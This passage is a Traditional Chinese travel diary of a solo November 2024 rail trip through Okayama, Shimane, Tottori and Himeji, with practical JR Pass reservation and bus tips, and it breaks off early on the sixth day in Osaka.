連上之後要輸入電子郵件，去信箱收信點連結啟用，才能持續連上使用；如果只是為了 Visit Japan 可以在連上 10 分鐘內打開網頁叫出入境 QR Code 即可。~= 17:04 搭上岡山機場前往 JR 岡山車站的巴士最新班次時刻表請參考官網 機場很小，順著路走出來就是往岡山車站的巴士，而且會有工作人員引導、不怕迷路直接上車。 航班太少，所以巴士除了按照表定發車時間，還會跟著班機抵達時間，加開班次；也不用怕滿員搭不上，滿員會再發車。 (照 表定要等到 19:05 才有車 ，但實際有加班車。) 2024/11/30 前出示護照可以 免費搭乘；免費接駁不定期舉辦， 去年來的時候沒有 。~= 18:00 抵達 JR 岡山車站遇到下班時間路上有點塞車，18:00 左右才到岡山車站。 (比預期多 30 分鐘)JR 岡山站兌換 JR Pass &amp; 預定明日前往松江的車票 官網可查詢 可兌換 JR Pass 的車站 ，不是每個站都可以換喔！(JR 岡山站可以) 岡山站找到自動售票處，排中間綠色的機器，只有這一台可以換 JR Pass兌換流程：準備好護照跟購買的 JR Pass 憑證 QR Code，可先選右上語言「繁體中文」，直接點左下「QRコードの読取り(QR碼掃描)」黃色按鈕兌換。 可以選擇開始使用日 ，可預約指定席的時間也是從開始使用日開始計算。 ⚠️ (像我是選擇明天開始)按照步驟掃描 JR Pass QR Code 和護照即可完成兌換。JR Pass QR Code兌換結果：上圖拿去年去兌換的 JR Pass 為圖例兌換完會有三張券，其他兩張長方形的是說明書，沒有用； 印有 PASS 的這張最重要，車站搭車進出站都是憑這張，要收好！預約 JR 指定席這邊很重要，根據 JR Pass 關西＆山陰周遊券官網 提供的資訊， 前往山陰地區的 JR YAKUMO 八雲 やくも 號 是全車指定席 ，無自由座⚠️⚠️⚠️ ( 2024年3月16日開始 )，均需提前劃位。 應該也可以從網路先預約， 之前就是從網路先預約博多到由布院的 JR ，只是要查一下。 Google Map 上的交通資訊不完整，詳細班次跟 列車名稱 可以從 JR 官網查詢得知 。 ⚠️⚠️⚠️JR Pass 預約指定席流程： JR Pass 關西＆山陰周遊券 的規定是可以使用機器預約 6 次指定席，超過要去人工櫃檯預約；各地區 JR Pass 次數跟限制不同，請參考官網資訊。 先查好出發地點的英文名與要去的地方 JR 站英文名 ，例如：OKAYAMA(岡山) -&gt; MATSUE(松江) 請注意是 JR 站英文名， 所以 要去福岡要打 Hakata XD 第一步先選「繁體中文」 第二步直接插入一張「JR Pass 車票」(同行多人要一起劃位會在第四步請你繼續插入。) 其他步驟照以下影片示範完成預約： 影片是我在 安來站 Yasugi 預約前往 鳥取站 Tottori 為例拍攝的整個過程。 (那站沒人在排自動售票機，才敢拿出手機錄下整個過程)預約完成： 因班次與明日行程安排，所以預約早 07:05 的班次先前往松江的飯店寄放行李 實際進出站還是用 JR Pass (上面那張) ⚠️⚠️⚠️，指定券這張只是讓你知道你的車廂跟座位編號。 已經沒靠窗位只能坐走道 QQ在岡山車站隨便買了一個炸牛排便當跟超商買些吃的喝的後就去飯店休息了；岡山車站正在整修，最後一天回程會再回來岡山。從桃太郎商店街這邊走五分鐘就到飯店。~= 19:00 回飯店開吃、休息便當的份量有點少、岡山白桃這罐水蜜桃酒很好喝！再加上懷念的日本超商(全家的)熱狗跟炸雞，今晚很滿足；晚安岡山！為明早早起開始日本行做足準備。岡山後樂園點燈今年 2024 的岡山後樂園點燈是 11月15日(金)～11月24日(日)，來的這天也還沒有；如果有點燈可以去看看，很美。去年 2023 山陽郵寄點燈我拍的照片Day 2 (11/13 週三) 島根 — 出雲大社、宍道湖夕陽07:05 搭乘 Yakumo やくも 八雲號 1 前往 松江車內蠻舒適的，前後有行李區可以直接放行李，座位也有充電座。總路程約需 2 小時 45 分鐘，可以感受到一路穿山越嶺，一大清早的很多地區都還是霧氣濛濛，頗有穿過山洞來到世外桃源的感覺；可惜沒劃到靠窗位，一路只能遠觀。09:49 抵達松江松江天氣超級好☀️，抵達松江站後直接前往今晚入住的飯店「 Matsue Urban Hotel 」寄放行李。寄放完再回到松江站此時大約 10:00，重新劃位 10:48 從 松江 前往 出雲市 的 Yakumo 3 號位子。 應該昨天劃位 岡山到松江 就要順便再劃位一張 松江到出雲市 的 ，因為下午想去看夕陽所以才先在松江寄放行李，不然就直接到出雲市不中途浪費時間換車了。 另外也可以搭乘 一畑電車大社線 前往出雲大社，總時間差不多。還有一點時間跑去超商買了兩個御飯糰、咖啡、炸雞帶著當午餐吃。一路上會經過宍到湖，超級大一開始以為是海，其實是湖。 劃位可以劃 D 靠窗位子才可以直接看宍到湖，我劃 A 側靠山看不到 QQ。11:12 抵達出雲市抵達松江站後一路小跑步，要趕 11:25 一畑電車北松江線 先前往 川跡車站。 一畑電車無法刷交通卡進站，要先在門口自動售票機(可用電子支付)買車票，不知道怎麼買直接跟站務人員說到 Izumo Taisha (出雲大社)即可。在 川跡車站 需要再換車 (跟著大家走到對面月台)，轉乘 一畑電車大社線 前往 出雲大社前 站。約 12 點抵達 出雲大社大神前的表參道很清幽漂亮，有時間的話這邊也有很多小店美食可以逛。 後來才知道出雲四座鳥居也很有名，其中一個白色大鳥居就在出車站表參道往神社反方向走就能在入口找到：來源：島根旅遊官網 詳細可參考 島根旅遊官網往上走到出雲大社入口，來的時間點 2024/11/13 正好是 神在祭 期間 ( 2024 令和 6 年 11/11~11/17 )，所以來參拜的日本人非常多。 日本每年的農曆 10 月(西曆 11 月)，全國八百萬神明齊聚出雲「神議」討論人間事務，如緣分安排與自然調和。 因此 這個月份在日本其他區稱為「神無月」（神不在）且多半無祭典 。 只有在出雲這稱為「神在月」意即只有出雲地區有神。 祭典包括迎接神明的「神迎祭」、祈求良緣的「縁結大祭」、以及送別神明的「神送り祭」 出雲大社供奉主神：大國主命（おおくにぬしのみこと）真的很巧，當初在安排時間的時候其實沒有刻意選這個時間點，是在查景點資訊的時候才知道。穿過入口鳥居後還要再走大約 5 分鐘才會到神社。日本第一大「日之丸」國旗進入神社後往左方看就會看到一根聳立的旗竿，上面是日本最大的日之丸國旗(約 75 張榻榻米、137 平方公尺)。朝這支旗杆的方向走就會來到「神樂殿」這裡有日本第一大 注連繩 。近看真的超大，尤其跟其他殿的一般注連繩比較，大概是其他的 10 倍大。(長度為 14 公尺、重量為 5 公噸、每隔幾年會換一次、純手工製作) 請記得最大的在「神樂殿」這裡，不要跟我一樣一開始以為在本殿。環繞走了一圈，人蠻多的，有的需要排很長的隊伍參拜。 出雲大社的參拜方式跟其他神社也不同：⚠️⚠️⚠️ 是 先鞠躬兩次、拍手四次，最後再鞠躬一次 。買了神在祭期間限定的御守。 (僅此一周販售)參拜完後拿了一本印章搜集簿，蓋出雲大社紀念章。出雲神在月神在社巡拜五個神大社位置。因時間有限出雲其他神社就沒去參拜了，沒有自駕感覺也很難搜集。~= 12:45 徒步前往 稻佐之濱 稻佐海灘 稲佐の浜公車班次太少只能用走的去，大約要 15 分鐘，途中會經過出雲阿國之墓，一路走到底就是稻佐之濱了。 稻佐之濱：來源：島根旅遊官網 日本神話淵源深厚的景點，圖中的小島叫弁天島，島上有一座小祠堂。 日本百大海灘，「日沒聖地出雲」地標、夕陽從弁天島背後落入海中的景色十分美麗，並獲登錄為日本遺產、也是神迎儀式的舉辦地點，在此恭迎日本全國神祇。因為到訪時間有限，無法待到夕陽，逛了一下就折返離開了。 回來台灣滑到 IG，才知道這邊有 砂御守可以求 ：https://www.instagram.com/reel/CynStXPyZAX/走回出雲大社公車站準備搭乘公車回到 JR 出雲站。可以看到來參拜等待進入出雲大社停車場的車輛綿延不絕。出雲大社公車站在紀念品店穿過廁所後面這邊，小小的一開始一直很怕等錯。此時約 13:15，要等 13:40 回 JR 出雲站的公車，肚子很餓就先去前面紀念品店跟旁邊買些東西拿手上簡單吃。在記念品店買了幾個中二貼紙。13:40 搭乘公車回 JR 出雲站 回出雲的路上遇到一位日本人跟我借行動電源，他的手機完全掛了，正好問他確認一下(順便練習我為數不多有記的日文)「 このバスは JR 出雲市駅へ行きますか 」，他回答「 はい 」(我也只聽得懂 hai)。~= 14:15 回到 JR 出雲市站(趕日落前去看宍道湖夕陽，根據資訊 當日 17:05 太陽下山 )這次就沒搭八雲號了，搭 14:54 前往米子的普通區間車，照 Google Map 建議從乃木站下車走路到宍道湖夕日觀景點。 往松江方向坐左邊(A)的話，經過宍道湖就可以直接看到湖景，沒錯我又坐錯邊了，坐到靠山的這邊。 這小站的區間車要按按鈕才會開門，第一次遇到。 ⚠️~=15:35 抵達 乃木站乃木站非常小，沒有站務員也沒有檢票機， 持 JR Pass 搭乘就直接出站就好，不要傻傻的把 JR Pass 留在收票盒子裡。⚠️⚠️⚠️從乃木站走有點失策，這邊很荒涼沒什麼人…不過還好中途有一家 7–11 買了熱狗跟炸雞、飲料邊吃邊等夕陽。16:00 宍道湖等夕陽 宍道湖日本第七大湖泊、宍道湖夕陽，日本第一夕日。 圖中小島嫁島神社，有一個白色小鳥居。 之前打錯打成穴道湖。有一隻鷺。往上走會到島根縣立美術館，那邊比較熱鬧也有咖啡店；但是階梯平台這邊景色角度比較好。16:45 夕陽西下本來沒什麼感覺，但接近夕日的時候開始體會到第一夕陽的魅力，剛剛的鷺也很配合地融入景色。夕陽接近地平線後時間用肉眼可見的速度在消逝，每一分每一秒太陽都在下降。很快地 17:01 就已經看不到太陽了。 真的很美、很療癒。最後再環顧一下 觀夕日階梯平台 一同看夕陽的人們。日落之後轉身等公車準備回松江了。夕陽指數夕陽指數可參考島根旅遊網站宍道湖遊覽船https://hakuchougo.jp/timetable/宍道湖這邊是有遊覽船的 ，可以在接近夕陽的時候搭乘，從船上欣賞夕陽；如果下次再來會想搭搭看。 可以直接使用 買 JR Pass 送的 山陰山陽地區PASS周遊3日券 免費搭乘，現省 1,800 日圓。18:00 回到松江站、飯店在松江站一樓伴手禮店買一些伴手禮想說山陰這邊比較特別就在這買伴手禮吧。比較特別的是牛骨湯拉麵，一般是豚骨，買了一盒回台灣品嚐。買了兩大盒餅乾(適合分同事)回來分同事，甜的普通但是是出雲大社參拜紀念，鹹的海鮮煎餅餅乾我覺得很好吃！回飯店本棟這邊沒有電梯，訂到的是 2 號館，可以從本棟大廳穿過天橋到 2 號館，2 號館 2 樓這邊有交誼廳微波爐、洗衣房、販賣機。 2 號館這邊體感沒有很安全，電梯沒有門禁、 1, 2 樓是膠囊旅館 感覺出入比較複雜、離本館大廳又有距離，因此入住後自己用行李箱把門堵好，怕有怪人闖進來。大廳可以拿免費的面膜、咖啡、茶包。覓食Check-in 後去外面覓食，外面蠻冷的也很暗、冷清，速速去車站周圍的餐廳外帶便當跟去超商買些吃的喝的就回飯店了。牛舌便當好吃，超商買的水蜜桃氣泡酒也好喝。 晚安松江。還有買幾乎每天一樣的隔日早餐組合…全家的這個果肉果汁每次來日本必喝！松江 宍道湖 24 小時直播：無意間找到的 Youtube 頻道，可以看到宍道湖天氣景色。Day 3 (11/14 週四) 松江堀川遊覽船、松江城、足立美術館一早先把行李寄放在飯店，到松江公車站搭公車去松江城遊船。Google Map 看不出月台，只能現場看，2 號月台這邊的車可以到松江城。在縣民會館前下車，一路往松江城走，停車場這邊就能看到「堀川遊覽船」乘船場。啟用買 JR Pass 山陰山陽地區PASS周遊3日券 免費搭乘 堀川遊覽船 下載 Discover Another Japan App 複製憑證信中的序號 打開 App 選擇「輸入」貼上序號按下「有效化」切換到「使用」填寫健康問券，填完會出現 QR Code 相機；掃描店家提供的 QR Code 把結果給他看即完成兌換。也可點「目標內容」查看可兌換項目。 實測計算時間是從第一次兌換目標開始 ，不是輸入序號有效化開始(我是 11/13 輸入的)。幫大家整理幾個熱門可使用地點： 宍道湖遊覽船，原價 1,800 日圓 松江城游船，原價 1600 日圓 足立美術館，原價 2300 日圓 松江城，原價 680 日圓 鳥取沙丘美術館，原價 800 日圓 通天閣，原價 800 日圓 岡山後樂園，原價 410 日圓真的很划算，光上面這些加總就可以省 8,390 日圓，已經是整個 JR Pass 金額的一半了。09:15 搭乘松江遊覽船直接用 周遊3日券 免費兌換搭乘。 今年比較溫暖還沒有換暖桌船 會有四個過橋點需要下降船身，要小心手頭不要夾到 全程約 50 分鐘 上船要脫鞋 ⚠️ 面向船夫的右邊那排才能直接拍到靠松江城的景，離船夫越遠離船頭越近(=剛進去的位子第一排) ⚠️ 如下圖上船囉。可能是因為楓葉季還沒開始，所以沒什麼人，同船的只有四位，很空。有四座橋過橋時會下降船身，要稍微彎腰趴著通過。一路吹風遊河很愜意，船夫也會一路介紹四周景點歷史(雖然我只聽得懂左邊hidari 右邊 migi…)。https://youtube.com/shorts/KA9xKZV16bk最後快到回程的地方會有一個松江城拍攝點，可以從這邊拍松江城遠景。遊船結束大約 10:00。10:15 松江城遊船回來走回來的方向，另一邊就是松江城入口，往上走就會到松江城。途經松江神社，來到松江城。因為時間有限想繼續前往足立美術館，就沒有上去了。回來到來的時候的反方向縣民會館前公車站等車回去。~=10:30 回飯店拿行李大約 10:30 回到松江站，回飯店拿行李。 在這邊等紅綠燈的時候差點被煞車失靈的腳踏車撞，還好我站的比較後面沒撞到我，出門在外還是要小心。 ⚠️⚠️⚠️到車站後同樣去劃位 Yakumo 14 指定席前往 安来(安來) (足立美術館)。11:03 前往安来11:03 才發車，在車站附近買一些吃的在車上果腹。 再見松江。鬆餅跟鹽味烤雞肉都很好吃。11:12 抵達安來站到安來站先別急著出站，找到觀光案內所可以寄放大型行李。(車站外有自動置物櫃但多半都是滿的)11:30 搭乘接駁車前往足立美術館最新時刻表請參考官網行李安放好之後就去搭乘往足立美術館的接駁車(免費、排隊依序上車)，早上來的時候沒什麼人。穿過鄉間小巷大約 20 分鐘抵達足立美術館。下車後一路往前走就是足立美術館入口。一樣直接使用 周遊3日券 免費兌換入場。第一件事是在入口前櫃檯依照自己行程安排領取對應時間的「接駁車整理券」，一人一張；在時間到的時候回到下車的地方憑券搭乘回安來站。我的行程預計是搭乘 14:46 從安來出發前往鳥取的 JR，請注意 往鳥取的班次沒有很多⚠️。 很重要！很重要！很重要！一定要拿，不然不保證有位子能上車。⚠️⚠️⚠️ 我就是那個不知道要拿，本來要搭 13:00 的，結果發現要拿券才回去拿，改搭 13:35 的車回安來。 還好我時間抓得很寬鬆。足立美術館 — 日本第一庭園可以靜靜的坐在這邊享受庭院美景。除了庭院，足立美術館核心還是館藏的諸多藝術品，禁止拍照，一路跟著動線觀賞藝術品，跟庭院。外面可看到部分的庭院景觀，可以感覺得到花費了很大的時間人力在維護這個造景。裡面有兩家喫茶室，除了甜點咖啡也有賣熟食；不妨在此駐足休息吃個東西看看景色。 因為我一個人來就沒有特別停留吃東西了。在紀念品店買了幅看到的館藏畫作 横山大觀《神国日本》(Yokoyama Taikan “Mt.Fuji”) 畫作 的紙板複製畫當紀念品。12:30 在外面商店街晃晃外面有一條小商店街，因為時間還很早就先在這亂晃。 這個島根和牛米漢堡 蠻難吃的 ，就是微波米漢堡飯黏黏的，我吃到的中間和牛還沒完全加熱冰冰的…如同前述，我一開始不知道要拿整理券，傻傻的就去等車，等到 13:00 發現不能上車，才去拿 13:35 的整理券。拿完整理券又再入場(可再入場)坐在一開始的室內觀景區域放空看景等車。13:55 回到安來站回安來站的路上有看到很紅的楓葉。這時間前往足立美術館的人反而比較多。這站沒什麼人、時間也還很早， 趁機錄了一段示範如何使用 JR Pass 預約指定席的影片 。島根貓在觀光案內所亂逛消磨時間。安來這邊的清水寺感覺也是一個賞楓秘境。14:46 搭乘特急火車前往鳥取車型很古老也只有兩節列車(一節自由座、一節指定席)，我的 26 寸行李箱放不上上面的行李層(新的 JR 可以但這車型的太小)，忘記可以走到最後一排放最後一排椅子後面，只能硬塞在自己的位子上。還好一路隔壁都沒人，自由座車廂看起來人比較多，指定席這邊大概才坐 6 成而已。 因為行程安排就沒有特別去 鬼太郎車站(境港車站) 跟 柯南車站(由良車站)了。來源來源 有興趣的朋友可以多安排前往。15:58 抵達 JR 鳥取站前往今晚的飯店 東橫INN 鳥取站南口 ，北口也有一間東橫 INN 沒訂到，北口那邊才是商店街比較熱鬧。17:00 鳥取亂逛離吃飯時間還有一小時，先去附近的 AEON 逛逛。約莫快 18:00 一路走到鳥取北口商店街附近覓食，前幾天都亂吃，今天想找一間餐廳吃好一點。找了一間在大街上評價也不錯的鳥取和牛餐廳 — 「 肉料理 Nick 」品嚐看看鳥取和牛，不知道是不是平日關係只有我一個人。 鳥取和牛雖然沒有神戶牛、近江牛有名，但鳥取是 日本和牛文化的發源地 。我點的是「鳥取和牛ひつまぶし」鳥取和牛三吃飯 3,500 日圓，價格上比神戶牛便宜很多。鳥取和牛很嫩，但是牛味較少，第一吃純吃和牛沒什麼味道。第二、三吃加上它附的湯變茶泡飯就很好吃。18:30 吃飽回車站、飯店順路先去劃隔天到姬路的車票。順路買宵夜回飯店晚上吃，還有 Y1000 養樂多 1000，這次其實沒特別喝也都睡得不錯… 晚安鳥取。Day 4 (11/15 週五) 白兔神社、鳥取沙丘、姬路早上先去白兔神社(姻緣)參拜，回到鳥取站北口往公車總站走，穿過公車大廳到後面 4 號月台等公車。依照 Google Map 搭乘白兔海岸線鹿野營業所 41 前往 白兔神社前。 鳥取的公車無法刷電子支付，只能付現金 鳥取的公車無法刷電子支付，只能付現金 鳥取的公車無法刷電子支付，只能付現金 請先提前準備好零錢，或是仟元大鈔去司機旁邊換零錢。 ⚠️⚠️⚠️ 車資約日圓 610 元。或先去鳥取車站買觀光一日交通券比較划算。下車前依照螢幕顯示金額投幣，我們是總站上車的無券所以看第一格前一格的金額付錢。~= 09:30 抵達白兔神社下車後往回天橋方向走就是白兔神社入口。 白兔神社源於「因幡的白兔」傳說。傳說中，大國主命(出雲大社)在幫助受傷的白兔恢復健康後，獲得白兔的祝福，成功贏得八上比賣公主的愛情。 白兔神社，象徵良緣與治癒，兩座神社也共同承載著祈求幸福與緣結的神聖意義。走到神社的距離不遠但路上有很多兔兔神像，都堆滿了姻緣石。 出雲大社也有很多因幡白兔雕像只是我忘了拍。鳥居上也堆滿了姻緣石。神社整體不大，大約 15–20 分鐘就可以參拜完。也花了 500 日圓買了姻緣石去雕像擺放。我買的因幡之白兔： 左邊：在出雲大社外的禮品店買的 右邊：在白兔神社買的(有詩籤) [![一隻兔子爲何要招惹一群鯊魚？經歷過兩次的死而復生，他竟然迎娶了自己祖先的女兒！大國主神話 大國主 因幡之白兔 根之囯 日本神話 蘭爸爸說故事](/assets/aacd5f5cacd1/e5da_hqdefault.jpg “一隻兔子爲何要招惹一群鯊魚？經歷過兩次的死而復生，他竟然迎娶了自己祖先的女兒！大國主神話 大國主 因幡之白兔 根之囯 日本神話 蘭爸爸說故事”)](https://www.youtube.com/watch?v=HbxBcKkfCnk){:target=”_blank”} 因幡之白兔跟大國主神的故事。~= 09:50 白兔神社外觀光案內所、白兔海灘觀光案內所裡真的有養一隻白色兔兔，也有賣一些吃的跟伴手禮，買了一個麵包果腹。白兔海灘很荒涼。公車要等到 10:45 才有往鳥取站方向的，覺得比較好的時間是更早來搭更早的車回去節省時間。from: 圣炜 上車記得拿整理券，上面有編號，下車依照編號對應金額硬幣連同整理券一同投入。 ⚠️車上遇到一位中國福建來的觀光客；他的行程剛好跟我相反，他先去姬路再去島根；於是互相推薦了一下景點，他推薦姬路可以先去書寫山圓教寺然後姬路城可以去圖中的攝影點拍照。 感謝他！最後去了覺得很值得。在相生町下車，到對向公車站轉搭前往鳥取沙丘方向的公車。搭到的這班要在沙丘東口下車走上去。 上車整理券拿到 3 號，下車看螢幕對應 3 號的金額投幣，以此為例就是要投 250 日圓。我混亂的參觀路線。下車後回頭岔路依照指標往上經過鳥取沙丘美術館繼續走到鳥取沙丘入口。 鳥取沙丘禁止事項， 尤其禁止在沙上作畫破壞自然 。⚠️鳥取沙丘真的有夠大，此時天空不作美有點陰雨，但如果是大太陽的話應該會很曬。~=12:00 抵達鳥取沙丘日本第一沙丘。人看起來都很渺小，一路走到沙丘脊上，有點抖而且沙子很鬆散不好走。走到最高點可以鳥瞰整個海岸線，背沙丘面海的場景只有這裡有。查網路資料好像可以騎駱駝但今天看起來是因為天氣不好所以沒有。最後離開鳥取沙丘再回頭看一眼，真的很巨大；鞋子裡不免也積了一些沙子， 看有人直接套塑膠鞋套，很聰明。這邊可以直接搭乘纜車到鳥取沙丘展望台，我想說先去下面吃有名的鳥取第一沙丘布丁，就沒搭了；後來順路用走的上去也不遠(~= 15 分鐘而已)。一路從停車場這邊出來，可以看到對面由隈研吾操刀的鳥取砂丘「Takahama Cafe 高濱咖啡廳」。買了一個嚐一嚐，味道真的不錯，布丁牛奶味濃郁口感像奶酪。特色是會給你一小包像沙子的砂糖，加下去一起吃。這邊路上也有一些餐廳可以吃飯，繼續往回走有一條小路，往上走一小段右邊就是沙丘美術館第二入口，左邊再往上走一點就是剛剛纜車會到的地方「鳥取沙丘展望台」。先往左邊去鳥取沙丘展望台看風景、吃東西，會先到纜車上下車處。可以先到販賣及旁邊這邊拿刷子清理鞋子的沙子。(門口工作人員也會提醒)最後也在這邊等公車回鳥取。展望台一二樓都是賣伴手禮跟有一個小餐廳，三樓可以上去眺望鳥取沙丘(雖然看不到什麼東西)。裡面吃的選擇也不太多，要先去旁邊自動販賣機投幣買對應的套餐票券，直接入場找位子坐再把券交給工作人員即可。隨便吃了個牡蠣套餐。也在這邊買了一些鳥取伴手禮。13:30 沙丘美術館吃飽往下走從二號入口往下逛沙丘美術館。(同樣用 周遊3日券 免費入場 )從二號入口開始參觀是從外面的沙雕開始參觀再一路從 3 樓 2 樓往下走，實際館內只有 2 樓有沙雕作品，場館不大、如果不是免費的話我可能不會進來。雖然場地小但是每個沙雕作品的細節都很精緻。還有一個沙雕的沙丘美術館的 QR Code 可以掃描。逛完一圈又往上走回到剛剛的鳥取沙丘展望台，東晃西晃吃個鳥取梨冰淇淋大約 14:20 在站牌這邊等車，等 14:42 往鳥取站的公車。 這站回鳥取的公車來的時候就已經接近滿人了，勉強擠上車，如果有時間可能會找一下從上一站上車會比較好。2025/01 Update回來才看到鳥取因為交通比較不方便，所以有提供計程車包車一日遊， 詳情請參考遊客中心或此網站 。15:10 回到鳥取站大約 15:10 回到鳥取站，此時開始下雨。在車站的商店亂晃，這邊的伴手禮店也有賣沙丘布丁！本來想去鳥取當地有名的 すなば珈琲（砂場咖啡），但下午三點多他們已經休息，就在車站內找了家 nana’s green tea 點個甜點＋咖啡休息充電(人跟手機都要充電)。店內舒適沒什麼人。蕨餅＋冰淇淋＋熱咖啡，很滿足。16:15 回飯店拿行李再回車站等車時間還很早，我們要搭 16:55 的特急超級白兔前往姬路。等車期間有看到柯南列車。16:55 上車前往姬路 再見山陰。劃到 Green Car 第一排座位，很舒適。 行李的話因為車比較晃不敢放到上面，索性走到最後一排座位，橫放在最後一排座位的後面。18:27 抵達姬路站剛好遇到他們的議員選舉，站外有議員在造勢演講，人很多。出站後直接去飯店 東橫INN 姬路站新幹線北口 ，最後三晚都住在這裡，北口這邊的東橫 INN 比較熱鬧；地圖上看很近，實際走起來體感有點距離，大約要 10 分鐘左右。分配到 14 樓頂樓的房間，窗外視野很好。可以直接從窗外回頭看姬路站鐵路，火車經過也會有輕微的軌道聲，但還好晚上之後就沒火車了。19:00 出去亂晃覓食一出來看到姬路城夜景覺得很美，不知道發什麼神經想走到姬路城拍夜景，太接近反而不好取景沒拍什麼照片就走，一路又冷又餓，應該直接去吃飯的。姬路城距離車站約 1 公里，來回走了快 30 分鐘。https://himeji-kyoukasuigetsu.com/en/https://himeji-kyoukasuigetsu.com/en/ 可惜這次錯過了姬路城冬季點燈活動，感覺很漂亮浪漫，之後有機會再來一次吧。 活動時間 2024年11月22日（五）才開始，一路到 2025年2月23日（日）。最後發現車站北口二樓這個看台拍姬路城就是最佳位子。買晚餐前先在姬路站的百貨公司 Piole Himeji 稍微逛了一下跟扭扭蛋。~=20:00 買晚餐回去從二樓空橋一路走到隔壁的 TERASSO 找到一家還沒關門的燒肉店外帶燒肉便當回飯店吃。途經超商同樣買了些吃的喝的。吃飽喝足洗完澡下樓洗個衣服，這次知道東橫要自備洗劑，先投幣買洗衣粉連同衣服投入洗衣機；這間的烘衣機很新很高級，還可以選溫度。 晚安姬路。Day 5 (11/16 週六) 書寫山圓教寺、姬路城、姬路周邊逛街每家東橫 INN 都有提供免費早餐，但我都為了趕行程早上幾乎都自己隨便吃個前一晚買的超商麵包跟咖啡就出門了。08:45 出門早上 8:45 出飯店穿過空無一人的商店街前往車站。08:55 搭公車前往書寫山圓教寺姬路車站有好幾個月台，Google Map 沒寫在哪個月台跟搭幾號公車，只能現場看指標，在 10 號月台搭乘 10 號 日 姫路駅北〜書写山ロープウェイ 公車。 書寫山圓教寺是電影末代武士的取景地點：https://visit-himeji.com/zh-hant/trip-ideas/featured-in-the-last-samurai-shoshazan-engyoji-temple-in-himeji/~=09:20 抵達書寫山纜車搭乘處下車後就是纜車搭乘處，在自動售票機買完來回票就能排隊等纜車了。(15 分鐘一班)書寫山這邊 11/15–17 有夜間特別開放活動，開到晚上 20:00，纜車時間也延長到 20:30。09:30 搭乘纜車上山09:35 抵達書寫山圓教寺入口需要買門票入場，那時候沒仔細看只買了 一般的入山志納金，無法乘坐來回交通車，要用走的上山 。⚠️⚠️⚠️ 坐車約：5 分鐘 爬山約：20 分鐘 (1 KM) 讓我再選的話我選擇多 500 日圓節省時間體力。不過還好是一大早體力精神還很充沛，坡度平緩就一路走走賞楓上山了。穿過仁王門大概還有 400 公尺。09:55 抵達摩尼殿書寫山圓教寺幅員遼闊，全部走完我覺得至少要 2 小時起跳。我只參拜了摩尼殿跟大講堂就折返下山了。摩尼殿可以脫鞋走進去參拜，也可以從這邊鳥瞰楓葉。很清幽安靜，但今年的楓葉較晚只有零星幾株轉紅。從殿後小路往前走前往大講堂。大講堂有一個 圓教寺 x 隈研吾 裝置藝術，展出到 12/1。大講堂旁的楓葉很紅。 到大講堂的時候剛好在誦經，也可以脫鞋入內參拜，日本的僧侶誦經方式跟台灣也不太一樣，會把經文整本拉開然後邊詠誦最後再合起來拍一下。旁邊的食堂也能進去參觀，有很多歷史文物陳列。所有建築都是古蹟(建於1282 年)，走在上面有一種穿越歷史的感覺，整體建築保存維護的很好。從食堂二樓看大講堂。參觀完大講堂後折返回摩尼殿，在摩尼殿外的商店買了一個現烤紅豆麻糬補充體力。(現烤的好吃，皮脆脆)Have a safe trip home.吃完後就再花 20 分鐘走路下山回到志納所入口。~=10:55 搭乘纜車下山11:10 回姬路市區下山走回來的時候的公車站，大約 11:05，等 11:10 公車回姬路市區。~= 11:35 抵達 姬路城公車下車後往前走一點就是姬路城遊船，不過天氣陰陰快下雨就沒去了。走進姬路城，門口這個橋景很好拍照！姬路城前的三之丸廣場很大，從這邊還要再走 5 分鐘才會到城入口。想說先去找昨天路人推薦的姬路城拍攝點，拍攝點在跟入城口相反的方向，在右邊的「姬路市動物園」裡面。看宣傳進入右手邊有卡皮巴拉，但可能因為太冷沒出來；進去後直接直走過橋看到摩天輪後右轉，在他後面有一塊空地就是拍攝點。https://youtube.com/shorts/XDquPOanhpQ這個拍攝點的取景很好，可惜沒有櫻花或楓葉陪襯。 拍完後大概繞了一下這個動物園，設施非常老舊(遊樂設施另外付費)，動物空間狹小、 很多看起來都很憂鬱、出現刻板行為，不忍直視 ，逛一下就離開了。拍完姬路城走回左側城入口參觀城內。買完票順著參觀路線一路進到城內。進入室內後同樣要脫鞋，會發一個塑膠袋裝鞋子。從二階往回看姬路站，一共有六階越往上越小、樓梯越陡峭，要排隊上樓。 此時已接近中午 12:30，飢腸轆轆加上今天出門忘了帶行動電源，手機已快沒電加上排隊人潮眾多，就沒再繼續往上爬了，在二階這裡折返出城。出城後一路走回三之丸廣場然後走出來外面。Kushiyaki Kobe beef在姬路城外面商店街找了一家有賣神戶牛的店，外帶了神戶牛丼飯跟串燒回飯店休息充電。13:20 回飯店休息天候不佳＋早上爬山＋手機沒電＝回飯店休息。除了份量有點小之外，這家的神戶牛味道還不錯。15:30 姬路站附近逛街大約休息到 15:30 又重新出門。姬路站這邊意外的沒什麼好逛的，只有車站這邊的 Piole 跟 SANYO 山陽電車那棟的百貨公司、周圍一條商店街，沒有唐吉訶德、麥當勞，Lawson 也只有一家、藥妝店也只有一家松本清。Piole 三樓的 Kiddy Land 有一些吉伊卡哇、這裡沒什麼人也不用排隊，帶了三隻寶寶回家，烏薩奇沒有買到睡衣版本的QQ。商店街亂逛，找扭蛋行程。雖然剛說沒什麼好逛，但至少扭蛋店還是有也有安利美特。接近傍晚時分開始下大雨，還好今天本來就無特別行程安排。~=18:00 吃晚餐おだしとワインとお料理と。motto在商店街隨便找了一家有神戶牛的店當晚餐。這家的特色是有一個前菜招財貓甜點，不會太甜還不錯。點了神戶牛排跟茶泡飯還有生啤。這家的神戶牛排我覺得普普通通，不太好咬也吃不太出神戶牛的味道，茶泡飯倒是蠻好吃的。吃飽再亂逛一下，雨後的姬路。~=20:00 回飯店休息＆看台日大戰日本視角、轉播內容完全聽不懂，但日本的轉播資訊很完整，左邊還有棒球知識補充，右邊有完整的球路分析。最後這場是日本勝。 晚安姬路。Day 6 (11/17週日) 大阪、神戶本來想衝 鳴門旋渦、明石海峽大橋 但是天候依然不佳，所以改去大阪神戶逛街。~= 08:45 搭乘新幹線自由座前往新大阪搭乘新幹線到新大阪(25 分鐘)再轉乘御堂筋線到大阪的時間跟搭一般的直接到大阪差不多、新幹線的班次很多，所以選擇搭比較舒適又可以充電的新幹線。9:17 抵達新大阪到新大阪後還要走一下到御堂筋線。先去 去年來京阪神 沒去到的難波八阪神社。搭到難波站出來再走一小段在某個巷子內就是神社。 才發現大阪也在測試人臉辨識進出站了。~=9:50 